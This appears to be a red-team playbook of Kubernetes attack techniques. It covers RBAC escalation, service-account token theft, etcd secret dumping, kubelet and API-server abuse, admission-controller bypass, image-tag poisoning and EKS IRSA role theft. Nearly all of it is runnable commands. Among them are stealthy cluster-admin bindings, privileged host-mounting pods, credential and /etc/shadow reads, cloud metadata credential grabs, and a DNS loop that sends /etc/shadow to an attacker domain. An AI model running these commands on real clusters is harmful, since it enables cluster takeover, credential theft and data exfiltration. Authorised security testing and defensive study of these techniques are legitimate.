# Kubernetes Cluster Attack Techniques

> **MITRE ATT&CK Mapping**: T1609 (Container Administration Command), T1610 (Deploy Container), T1613 (Container and Resource Discovery)
> **Tactic**: Execution, Lateral Movement, Discovery, Privilege Escalation
> **Platforms**: Containers, Linux, Kubernetes (EKS, GKE, AKS, self-managed)
> **Required Permissions**: Varies (from unauthenticated to cluster-admin)
> **OPSEC Risk**: Medium-High - Kubernetes API audit logs capture most operations; risk depends on the cluster's monitoring maturity

---

## Strategic Overview

Kubernetes has become the dominant container orchestration platform, running critical workloads across every major cloud provider and in on-premises data centers. Its complexity -- encompassing RBAC, service accounts, admission controllers, network policies, secrets management, and multi-tenant isolation -- creates a vast attack surface where misconfigurations are the norm rather than the exception. Red team assessments consistently find that initial access through a single compromised pod can escalate to full cluster takeover through chains of RBAC abuse, service account token theft, and lateral movement across namespaces.

The Kubernetes threat landscape in 2025 has been shaped by several significant developments. The "IngressNightmare" vulnerabilities (CVE-2025-1974 and related CVEs) demonstrated that unauthenticated remote code execution in the Ingress-NGINX controller could lead to complete cluster takeover, as the ingress controller by default has access to all Secrets cluster-wide. The GitRepo volume vulnerability (CVE-2025-1767) showed that even deprecated features can be exploited for cross-pod data access. Meanwhile, cloud-specific attack vectors targeting EKS Pod Identity, GKE Workload Identity, and AKS managed identities have matured, with red team operators developing sophisticated techniques to abuse IAM trust boundaries between Kubernetes service accounts and cloud IAM roles.

Understanding Kubernetes attacks requires thinking in terms of attack graphs rather than linear kill chains. An attacker with `list` permissions on Secrets in a single namespace can potentially pivot to service account tokens, which may have `create` permissions on Pods, which can mount hostPath volumes, which provide node-level access, which exposes the kubelet credentials, which enables cluster-wide API access. These transitive permission chains are difficult for defenders to visualize and audit, making them particularly valuable for red team operations.

---

## Technical Deep-Dive

### 1. RBAC Abuse and Privilege Escalation

Kubernetes Role-Based Access Control (RBAC) is the primary authorization mechanism. Misconfigurations in RBAC are among the most common and exploitable weaknesses in Kubernetes clusters.

#### Enumerating Current Permissions

```bash
# Check what the current service account can do
kubectl auth can-i --list
kubectl auth can-i --list --namespace=kube-system

# Check specific high-value permissions
kubectl auth can-i create pods
kubectl auth can-i create pods --subresource=exec
kubectl auth can-i get secrets
kubectl auth can-i create clusterrolebindings
kubectl auth can-i '*' '*'  # Check for wildcard (cluster-admin equivalent)

# Using the API directly with a stolen token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -s -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets","namespace":"kube-system"}}}'

# Enumerate all cluster roles and bindings
kubectl get clusterroles -o json | jq '.items[] | select(.rules[].resources[] == "*") | .metadata.name'
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name == "cluster-admin") | .subjects'
```

#### ClusterRoleBinding to cluster-admin

```bash
# If you have create clusterrolebindings permission:
# Bind your service account to cluster-admin

# Identify the current service account
SA_NAME=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
SA_TOKEN_NAME=$(kubectl get sa default -n $SA_NAME -o jsonpath='{.secrets[0].name}')

# Create ClusterRoleBinding to escalate to cluster-admin
kubectl create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=$SA_NAME:default

# Or via YAML for more control
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: legitimate-sounding-name
subjects:
- kind: ServiceAccount
  name: default
  namespace: ${SA_NAME}
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

# Verify escalation
kubectl auth can-i '*' '*'  # Should return "yes"
kubectl get secrets --all-namespaces
```

#### The "escalate" and "bind" Verbs

```bash
# The "escalate" verb allows creating Roles/ClusterRoles with permissions
# the creator does not possess. This is a critical escalation path.

# Check if current SA has escalate permission
kubectl auth can-i escalate roles
kubectl auth can-i escalate clusterroles
kubectl auth can-i bind roles
kubectl auth can-i bind clusterroles

# If you have escalate + create roles:
# Create a new ClusterRole with full permissions
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: super-admin
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
- nonResourceURLs: ["*"]
  verbs: ["*"]
EOF

# Then bind it to your service account
kubectl create clusterrolebinding super-admin-binding \
  --clusterrole=super-admin \
  --serviceaccount=default:default
```

#### Role Aggregation Chains

```bash
# ClusterRoles can use aggregation rules to automatically include
# permissions from other roles matching specific labels.
# An attacker with label-edit permissions can inject rules into
# aggregated roles.

# Find aggregated ClusterRoles
kubectl get clusterroles -o json | jq '.items[] | select(.aggregationRule != null) | {name: .metadata.name, labels: .aggregationRule.clusterRoleSelectors}'

# The built-in "admin", "edit", and "view" roles use aggregation:
# admin: rbac.authorization.k8s.io/aggregate-to-admin: "true"
# edit:  rbac.authorization.k8s.io/aggregate-to-edit: "true"
# view:  rbac.authorization.k8s.io/aggregate-to-view: "true"

# If you can create ClusterRoles with the right labels:
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: injected-admin-privs
  labels:
    rbac.authorization.k8s.io/aggregate-to-edit: "true"
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list", "watch"]
EOF
# Now every user with the "edit" role also has secret read access
```

---

### 2. Service Account Token Theft

Every pod in Kubernetes has an associated service account, and by default, the service account token is automatically mounted into the pod at a well-known path. These tokens provide API authentication and are a primary target for attackers.

#### Default Token Location and Usage

```bash
# Default automounted token path
TOKEN_PATH=/var/run/secrets/kubernetes.io/serviceaccount/token
CA_PATH=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Read the token
TOKEN=$(cat $TOKEN_PATH)

# Decode the JWT to understand its permissions
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Look for: "kubernetes.io/serviceaccount/service-account.name"
# and namespace information

# Use the token to authenticate to the API server
APISERVER=https://kubernetes.default.svc:443

# List pods in current namespace
curl -s -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# List all namespaces (requires cluster-level permissions)
curl -s -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces

# Try to list secrets
curl -s -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets
```

#### Projected Volume Tokens (Kubernetes 1.20+)

```bash
# Newer Kubernetes versions use projected volume tokens instead of
# long-lived secret-based tokens. These are short-lived and audience-bound.

# Projected tokens are still at the same path but have expiration
cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d | jq '.exp'
# Check: is it a projected (short-lived) or legacy (long-lived) token?

# Projected token characteristics:
# - Expires (typically 1 hour, auto-rotated by kubelet)
# - Has an audience field
# - Cannot be extracted from Secrets (not stored as a Secret)
# - Still usable for the duration of its validity

# Attack: Even with projected tokens, the token is valid for its lifetime
# and can be exfiltrated and used from outside the cluster
```

#### TokenRequest API Abuse

```bash
# If you have serviceaccounts/token create permission:
# You can request tokens for ANY service account in the namespace

# Request a token for a different service account
curl -s -k -H "Authorization: Bearer $TOKEN" \
  -X POST $APISERVER/api/v1/namespaces/$NAMESPACE/serviceaccounts/admin-sa/token \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "authentication.k8s.io/v1",
    "kind": "TokenRequest",
    "spec": {
      "audiences": ["https://kubernetes.default.svc"],
      "expirationSeconds": 86400
    }
  }' | jq -r '.status.token'

# This effectively impersonates the target service account
# Look for high-privilege SAs like:
# - kube-system:default
# - monitoring service accounts (often have broad read access)
# - CI/CD service accounts (often have deploy permissions)
```

#### Stealing Tokens from Other Pods

```bash
# If you have exec into other pods or can mount their filesystems:

# Method 1: kubectl exec into another pod to read its token
kubectl exec -it <target-pod> -n <namespace> -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Method 2: If you have node access, read tokens from kubelet
# Kubelet stores pod volumes on the node filesystem
find /var/lib/kubelet/pods -name "token" -path "*/serviceaccount/*" 2>/dev/null
# Each file contains the SA token for that pod

# Method 3: List all secrets containing SA tokens
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | select(.type == "kubernetes.io/service-account-token") | {namespace: .metadata.namespace, name: .metadata.name, sa: .metadata.annotations["kubernetes.io/service-account.name"]}'

# Method 4: Environment variables (some apps expose tokens in env)
kubectl exec <pod> -- env | grep -i "token\|secret\|key\|password"
```

---

### 3. etcd Direct Access

etcd is the backbone of Kubernetes, storing all cluster state including Secrets, RBAC configurations, and service account tokens. Direct access to etcd bypasses all Kubernetes authorization controls.

#### Discovery and Unauthenticated Access

```bash
# Default etcd ports:
# 2379: Client communication
# 2380: Peer communication

# Step 1: Discover etcd
# From inside the cluster:
nmap -p 2379,2380 <control-plane-ip>
# Or check environment variables:
env | grep ETCD
# Or check API server configuration:
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep etcd

# Step 2: Test unauthenticated access
curl -s http://<etcd-ip>:2379/version
curl -s http://<etcd-ip>:2379/v2/keys/?recursive=true
# If this returns data, etcd is unauthenticated (critical finding)

# Step 3: Using etcdctl
export ETCDCTL_API=3
etcdctl --endpoints=http://<etcd-ip>:2379 endpoint health
etcdctl --endpoints=http://<etcd-ip>:2379 get / --prefix --keys-only
```

#### Authenticated Access (Certificate-Based)

```bash
# If etcd requires client certificates (proper configuration):
# Certificates are typically stored on the control plane at:
# /etc/kubernetes/pki/etcd/ca.crt
# /etc/kubernetes/pki/etcd/server.crt
# /etc/kubernetes/pki/etcd/server.key
# Or peer certificates:
# /etc/kubernetes/pki/etcd/peer.crt
# /etc/kubernetes/pki/etcd/peer.key

# If you have node access on a control plane node:
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only

# Or extract the certs from the kube-apiserver manifest:
grep -A3 "etcd" /etc/kubernetes/manifests/kube-apiserver.yaml
```

#### Extracting Secrets from etcd

```bash
# Kubernetes Secrets are stored in etcd under /registry/secrets/
# By default, they are base64-encoded but NOT encrypted

# Dump all secrets
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix

# Get a specific secret
etcdctl get /registry/secrets/kube-system/admin-token --print-value-only

# Dump all service account tokens
etcdctl get /registry/secrets --prefix | grep -a "token"

# Extract RBAC configurations
etcdctl get /registry/clusterroles --prefix
etcdctl get /registry/clusterrolebindings --prefix

# Dump all ConfigMaps (may contain sensitive data)
etcdctl get /registry/configmaps --prefix

# Full cluster state dump
etcdctl get "" --prefix --keys-only | head -100

# Check if encryption at rest is configured
# Look for EncryptionConfiguration in API server manifest
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep encryption
# If --encryption-provider-config is set, secrets may be encrypted
```

#### etcd Snapshot Exploitation

```bash
# If you can obtain an etcd snapshot (backup):
# These are often stored on shared storage, S3 buckets, etc.

# Restore snapshot to a local etcd instance for offline analysis
etcdctl snapshot restore /path/to/snapshot.db \
  --data-dir=/tmp/etcd-restore

# Start a local etcd with the restored data
etcd --data-dir=/tmp/etcd-restore \
  --listen-client-urls=http://127.0.0.1:12379 \
  --advertise-client-urls=http://127.0.0.1:12379 &

# Now query the local instance for secrets
ETCDCTL_API=3 etcdctl --endpoints=http://127.0.0.1:12379 \
  get /registry/secrets --prefix
```

---

### 4. API Server Exploitation

The Kubernetes API server is the central management component. Misconfigurations in its authentication and authorization settings can provide initial access or escalation paths.

#### Anonymous Authentication

```bash
# Check if anonymous authentication is enabled (default: enabled)
# Anonymous requests are assigned the system:anonymous user and
# system:unauthenticated group

# Test anonymous access
curl -sk https://<apiserver>:6443/api/v1/namespaces
curl -sk https://<apiserver>:6443/version
curl -sk https://<apiserver>:6443/apis

# Check what anonymous users can do
curl -sk https://<apiserver>:6443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"pods","namespace":"default"}}}'

# Some clusters grant anonymous users read access to discovery endpoints
curl -sk https://<apiserver>:6443/api/v1  # API resource discovery
curl -sk https://<apiserver>:6443/openapi/v2  # Full API schema
curl -sk https://<apiserver>:6443/.well-known/openid-configuration  # OIDC config
```

#### Insecure Port (Legacy)

```bash
# The insecure port (--insecure-port, default 8080) was deprecated in
# Kubernetes 1.20 and removed in 1.24. However, older clusters may
# still have it enabled.

# The insecure port:
# - No authentication
# - No authorization
# - Full API access
# - Typically bound to localhost

curl -s http://localhost:8080/api/v1/namespaces
curl -s http://localhost:8080/api/v1/secrets
curl -s http://localhost:8080/api/v1/pods

# If you have SSRF to localhost on a control plane node:
# This gives immediate cluster-admin access
```

#### API Server Impersonation

```bash
# If you have the "impersonate" permission, you can act as any user/group

# Check impersonation permissions
kubectl auth can-i impersonate users
kubectl auth can-i impersonate groups
kubectl auth can-i impersonate serviceaccounts

# Impersonate cluster-admin
kubectl get secrets --all-namespaces \
  --as=system:admin \
  --as-group=system:masters

# Impersonate a specific service account
kubectl get pods --all-namespaces \
  --as=system:serviceaccount:kube-system:default

# Via API headers:
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: system:admin" \
  -H "Impersonate-Group: system:masters" \
  https://<apiserver>:6443/api/v1/secrets
```

#### SSRF to API Server

```bash
# Web applications running in pods can be exploited via SSRF
# to reach the API server at its internal address

# Internal API server addresses:
# https://kubernetes.default.svc:443
# https://kubernetes.default.svc.cluster.local:443
# https://<apiserver-cluster-ip>:443

# If a pod's service account has elevated permissions, SSRF can be
# used to make authenticated API calls using the pod's token

# Example SSRF payloads:
# https://kubernetes.default.svc/api/v1/namespaces/default/secrets
# https://kubernetes.default.svc/api/v1/pods
# https://kubernetes.default.svc/apis/apps/v1/deployments
```

---

### 5. Pod Security Exploitation

Pod specifications allow numerous security-relevant configurations. When Pod Security Admission (PSA) or external policy engines are not properly configured, attackers can create pods with elevated privileges.

#### Privileged Pod Creation

```bash
# If you can create pods, create one with maximum privileges
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: pwn
    image: ubuntu:latest
    command: ["/bin/bash", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
      type: Socket
  nodeSelector:
    node-role.kubernetes.io/control-plane: ""
  tolerations:
  - operator: Exists
    effect: NoSchedule
EOF

# This pod:
# - Shares host network (access to all host network interfaces)
# - Shares host PID namespace (see all host processes)
# - Shares host IPC namespace (access host shared memory)
# - Runs privileged (all capabilities, no seccomp/AppArmor)
# - Mounts host root filesystem at /host
# - Mounts Docker socket
# - Targets control plane node (via nodeSelector + toleration)
```

#### hostPath Volume Abuse

```bash
# Even without privileged mode, hostPath volumes can be devastating

# Mount host /etc to read credentials
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: host-etc-reader
spec:
  containers:
  - name: reader
    image: alpine
    command: ["sleep", "infinity"]
    volumeMounts:
    - name: host-etc
      mountPath: /host-etc
      readOnly: true
  volumes:
  - name: host-etc
    hostPath:
      path: /etc
      type: Directory
EOF

# Read host files:
kubectl exec host-etc-reader -- cat /host-etc/shadow
kubectl exec host-etc-reader -- cat /host-etc/kubernetes/admin.conf

# Mount kubelet directory for token theft
# hostPath: /var/lib/kubelet/pods -> contains all pod SA tokens

# Mount container runtime socket
# hostPath: /var/run/docker.sock -> full container runtime control
# hostPath: /run/containerd/containerd.sock -> containerd access
# hostPath: /var/run/crio/crio.sock -> CRI-O access
```

#### PodSecurityAdmission Bypass

```bash
# Pod Security Admission (PSA) enforces three levels:
# privileged, baseline, restricted

# Check namespace labels for PSA enforcement
kubectl get ns --show-labels | grep pod-security

# Bypass strategies:

# 1. Find namespaces without PSA enforcement
kubectl get ns -o json | jq '.items[] | select(.metadata.labels["pod-security.kubernetes.io/enforce"] == null) | .metadata.name'

# 2. Target namespaces with "warn" or "audit" mode (not "enforce")
kubectl get ns -o json | jq '.items[] | select(.metadata.labels["pod-security.kubernetes.io/warn"] != null and .metadata.labels["pod-security.kubernetes.io/enforce"] == null) | .metadata.name'

# 3. Use init containers (some policies may not check init containers)
# 4. Use ephemeral containers (some policies may not check these)
kubectl debug -it <pod> --image=alpine --target=<container>

# 5. Abuse allowed volume types
# Even "restricted" allows emptyDir, configMap, secret, projected
# ConfigMaps/Secrets can contain exploit payloads
```

---

### 6. Kubelet Exploitation

The kubelet is the agent running on each node that manages pod lifecycle. Its API endpoints can provide direct access to running containers and sensitive cluster information.

#### Port 10250 (Authenticated Kubelet API)

```bash
# Port 10250 is the default kubelet HTTPS port
# It provides full container management capabilities

# Step 1: Discover kubelet endpoints
nmap -p 10250 <node-ip-range>

# Step 2: Test access (may require certificates or tokens)
curl -sk https://<node-ip>:10250/pods
# If this returns pod data, you have access

# Step 3: List all pods on the node
curl -sk https://<node-ip>:10250/pods | jq '.items[].metadata.name'

# Step 4: Execute commands in any pod on the node
# Using the /run endpoint (POST):
curl -sk https://<node-ip>:10250/run/<namespace>/<pod>/<container> \
  -d "cmd=id"

curl -sk https://<node-ip>:10250/run/<namespace>/<pod>/<container> \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# Step 5: Execute commands via /exec endpoint (WebSocket-based)
# Using kubeletctl tool for easier interaction:
kubeletctl --server <node-ip> pods
kubeletctl --server <node-ip> exec "id" -p <pod> -c <container>
kubeletctl --server <node-ip> exec "cat /etc/shadow" -p <pod> -c <container>

# Step 6: Scan all pods for tokens
kubeletctl --server <node-ip> scan token
```

#### Port 10255 (Read-Only Kubelet API)

```bash
# Port 10255 is the kubelet read-only HTTP port
# No authentication required
# Provides pod information but no exec capability

# Deprecated since K8s 1.16 but still found in many clusters

curl -s http://<node-ip>:10255/pods | jq '.'
curl -s http://<node-ip>:10255/spec/
curl -s http://<node-ip>:10255/stats/summary
curl -s http://<node-ip>:10255/metrics

# Extract useful information:
# - Pod names, namespaces, images
# - Container environment variables (may contain secrets)
# - Node resource information
# - Running container details
curl -s http://<node-ip>:10255/pods | jq '.items[].spec.containers[].env'
```

#### Kubelet Certificate Authentication Bypass

```bash
# By default, kubelet uses anonymous authentication (--anonymous-auth=true)
# When set to false, it requires TLS client certificates

# If you have node access, kubelet certs are at:
# /var/lib/kubelet/pki/kubelet-client-current.pem
# /var/lib/kubelet/pki/kubelet.key

# Use these certs to authenticate to kubelet on ANY node:
curl -sk --cert /var/lib/kubelet/pki/kubelet-client-current.pem \
  --key /var/lib/kubelet/pki/kubelet.key \
  https://<other-node-ip>:10250/pods

# The kubelet client certificate is often signed by the cluster CA
# and may have broad permissions via the system:nodes group

# nodes/proxy permission allows proxying through the API server:
kubectl get --raw "/api/v1/nodes/<node-name>/proxy/pods"
kubectl get --raw "/api/v1/nodes/<node-name>/proxy/run/<ns>/<pod>/<container>?cmd=id"
```

---

### 7. Secret Extraction

Kubernetes Secrets are base64-encoded (not encrypted by default) and represent one of the highest-value targets in cluster exploitation.

```bash
# === Direct Secret Access ===
# List secrets in current namespace
kubectl get secrets
kubectl get secrets -o yaml  # Full content with base64-encoded values

# Decode a specific secret
kubectl get secret <name> -o jsonpath='{.data.password}' | base64 -d
kubectl get secret <name> -o json | jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'

# List secrets across all namespaces (requires cluster-level permissions)
kubectl get secrets --all-namespaces
kubectl get secrets --all-namespaces -o json | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name, type: .type}'

# === Environment Variable Secrets ===
# Secrets injected as env vars are visible in pod specs
kubectl get pods -o json | jq '.items[].spec.containers[].env[] | select(.valueFrom.secretKeyRef != null)'

# They're also visible in /proc/<pid>/environ on the node
# And in the container's environment:
kubectl exec <pod> -- env | sort

# === ConfigMap Secrets ===
# ConfigMaps are often used to store sensitive data incorrectly
kubectl get configmaps --all-namespaces -o json | jq '.items[] | select(.data | to_entries[] | .value | test("password|secret|key|token|apikey|api_key"; "i")) | {namespace: .metadata.namespace, name: .metadata.name}'

# === Image Pull Secrets ===
# Container registry credentials
kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.type == "kubernetes.io/dockerconfigjson") | {namespace: .metadata.namespace, name: .metadata.name}'
kubectl get secret <registry-secret> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq .

# === TLS Secrets ===
# TLS certificates and private keys
kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.type == "kubernetes.io/tls") | {namespace: .metadata.namespace, name: .metadata.name}'
kubectl get secret <tls-secret> -o jsonpath='{.data.tls\.key}' | base64 -d

# === External Secrets Operator ===
# If external-secrets operator is installed, check ExternalSecret resources
kubectl get externalsecrets --all-namespaces
kubectl get secretstores --all-namespaces
kubectl get clustersecretstores
# These reveal which external secret backends (AWS Secrets Manager,
# HashiCorp Vault, etc.) are in use and how they are configured
```

---

### 8. Admission Controller Bypass

Admission controllers act as gatekeepers for the Kubernetes API, enforcing policies on resource creation and modification. Bypassing these controllers can allow deployment of malicious or privileged workloads.

#### Webhook Timeout Exploitation

```bash
# Validating/Mutating webhooks have configurable timeouts (1-30 seconds)
# If the webhook times out, the failurePolicy determines behavior:
# - "Fail" = request denied (secure)
# - "Ignore" = request allowed (insecure!)

# Step 1: Identify webhook configurations
kubectl get validatingwebhookconfigurations -o json | jq '.items[] | {name: .metadata.name, failurePolicy: .webhooks[].failurePolicy, timeout: .webhooks[].timeoutSeconds}'
kubectl get mutatingwebhookconfigurations -o json | jq '.items[] | {name: .metadata.name, failurePolicy: .webhooks[].failurePolicy, timeout: .webhooks[].timeoutSeconds}'

# Step 2: If failurePolicy is "Ignore", cause the webhook to timeout:
# - DDoS the webhook endpoint
# - Create network partition between API server and webhook
# - Send requests during webhook maintenance windows
# - Overload the webhook with many concurrent requests

# Step 3: While webhook is unavailable, create privileged resources
# The API server will allow them due to failurePolicy: Ignore
```

#### Dry-Run Abuse

```bash
# The --dry-run flag tells the API server to process the request
# without persisting it. Some webhooks check for dryRun and skip
# expensive validation when dryRun is true.

# However, side effects in webhooks should be suppressed on dry-run
# If a webhook does NOT properly check dryRun, it may:
# 1. Create side-effect resources during dry-run
# 2. Skip validation entirely for dry-run requests

# Test: Submit malicious payload with dry-run to see if webhook rejects it
kubectl apply -f malicious-pod.yaml --dry-run=server
# If this succeeds, the webhook may not be checking dry-run requests properly

# Some admission controllers have separate logic paths for dry-run
# that may be less restrictive
```

#### Namespace Selector Evasion

```bash
# Webhooks often use namespaceSelector to limit which namespaces
# they apply to. Finding or creating exempt namespaces can bypass policies.

# Step 1: Check webhook namespace selectors
kubectl get validatingwebhookconfigurations -o json | jq '.items[].webhooks[] | {name: .name, namespaceSelector: .namespaceSelector}'

# Step 2: Find namespaces that don't match the selector
# Common exemption patterns:
# - kube-system (often excluded from policy enforcement)
# - Namespaces without specific labels
# - Namespaces with exemption labels

# Step 3: If you can create namespaces, create one that evades the selector
kubectl create namespace bypass-ns
# Don't add the label that the webhook selector matches on

# Step 4: Deploy malicious workloads in the exempt namespace
kubectl apply -f malicious-pod.yaml -n bypass-ns

# Step 5: Check for object selector (per-resource exemptions)
# Some webhooks use objectSelector to filter specific resources
# Resources without matching labels may bypass the webhook
```

---

### 9. Supply Chain Attacks

The Kubernetes supply chain encompasses container images, Helm charts, operators, and CI/CD pipelines. Compromising any link in this chain can provide persistent cluster access.

#### Malicious Helm Charts

```bash
# Helm charts can include:
# - Privileged pod specs
# - ClusterRoleBindings to cluster-admin
# - Webhook configurations
# - CronJobs for persistence
# - Init containers that exfiltrate data

# Inspect a Helm chart before installation
helm template <chart-name> | grep -E "privileged|hostNetwork|hostPID|cluster-admin|hostPath"

# Check for hooks (pre-install, post-install, etc.)
helm template <chart-name> | grep "helm.sh/hook"
# Hooks can run arbitrary jobs before/after installation

# Common attack: Trojanized popular charts with subtle modifications
# - Additional container in a deployment
# - Modified environment variables
# - Webhook that intercepts all pod creation
```

#### Image Tag Mutation and Registry Attacks

```bash
# Image tag mutation: The :latest tag (and any mutable tag) can be
# changed to point to a different image at any time

# Step 1: If you have access to the container registry:
# Push a malicious image to a tag that deployments use
docker tag malicious-image:latest registry.company.com/app:v2.1.0
docker push registry.company.com/app:v2.1.0

# Step 2: Wait for pods to restart and pull the malicious image
# Or force a restart:
kubectl rollout restart deployment/<target-deployment>

# Registry credential theft:
# Registry pull secrets are stored as Kubernetes secrets
kubectl get secrets -o json | jq '.items[] | select(.type=="kubernetes.io/dockerconfigjson") | .data[".dockerconfigjson"]' | base64 -d

# Image layer poisoning:
# Modify a base image layer to inject malicious code
# All images built FROM this base will be compromised
```

#### Container Image Layer Analysis

```bash
# Analyze image layers for sensitive data
# Using dive or docker history
docker history <image> --no-trunc
docker save <image> -o image.tar
tar xf image.tar
# Inspect each layer for secrets, keys, credentials

# Using crane for remote analysis (no docker daemon needed)
crane manifest <image>
crane config <image> | jq '.history'

# Common findings:
# - SSH keys baked into images
# - API keys in environment variables
# - Database passwords in config files
# - Source code with hardcoded credentials
```

---

### 10. Network Policy Bypass

Kubernetes NetworkPolicies control pod-to-pod communication. When missing or misconfigured, they enable lateral movement and data exfiltration.

```bash
# Check for NetworkPolicies
kubectl get networkpolicies --all-namespaces
# If empty: NO network policies exist (all traffic is allowed)

# Check specific namespace
kubectl get networkpolicies -n <namespace> -o yaml

# === Missing NetworkPolicies ===
# Without policies, all pods can communicate with all other pods
# across all namespaces. This enables:
# - Scanning all services: nmap -sV <pod-cidr>
# - Accessing databases directly
# - Reaching other microservices
# - SSRF to cloud metadata service

# === DNS Exfiltration ===
# Even with strict NetworkPolicies, DNS (port 53) is typically allowed
# because pods need it for service discovery

# Exfiltrate data via DNS queries
data=$(cat /etc/shadow | base64 | tr -d '\n')
# Split into DNS-compatible chunks (63 chars max per label)
echo $data | fold -w 63 | while read chunk; do
  nslookup "$chunk.exfil.attacker.com" 2>/dev/null
done

# Tools for DNS exfiltration:
# - dnscat2
# - iodine
# - dns2tcp

# === Cloud Metadata Service Access ===
# Most cloud-hosted K8s clusters can reach the metadata service
# This is often NOT blocked by NetworkPolicies

# AWS
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/

# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# === Service Mesh Bypass ===
# If Istio/Linkerd is deployed, sidecar proxies enforce mTLS
# But init containers and containers that start before the sidecar
# may bypass the mesh
# Also, direct pod-to-pod communication bypassing the sidecar
# is possible if you know the pod IP
```

---

### 11. Cloud-Specific Kubernetes Attacks

#### EKS (AWS) - IRSA Abuse

```bash
# IAM Roles for Service Accounts (IRSA) maps K8s service accounts
# to AWS IAM roles via OIDC federation

# Step 1: Identify pods with IRSA
kubectl get pods -o json | jq '.items[] | select(.spec.volumes[]?.projected.sources[]?.serviceAccountToken.audience == "sts.amazonaws.com") | .metadata.name'

# Or check for the AWS environment variables
kubectl exec <pod> -- env | grep AWS
# AWS_ROLE_ARN=arn:aws:iam::123456789012:role/eks-pod-role
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Step 2: Steal the IRSA token
kubectl exec <pod> -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Step 3: Assume the IAM role from outside the cluster
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::123456789012:role/eks-pod-role \
  --role-session-name pwned \
  --web-identity-token file:///tmp/stolen-token

# Common IRSA trust policy misconfiguration:
# Trust policy with wildcard service account:
# "Condition": {
#   "StringLike": {
#     "oidc.eks.*.amazonaws.com:sub": "system:serviceaccount:*:*"
#   }
# }
# This allows ANY service account in ANY namespace to assume the role

# Step 4: Enumerate what the stolen role can do
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name eks-pod-role

# EKS Pod Identity (newer alternative to IRSA):
# Uses a node-level agent instead of OIDC
# Tokens at: /var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token
kubectl exec <pod> -- cat /var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token

# Node IAM role theft (if you escape to the node):
# All EC2 instances in EKS have a node IAM role
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns the node role name, then:
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns temporary credentials
# Node roles typically have permissions to:
# - Pull images from ECR
# - Describe EC2 instances
# - Access EBS volumes
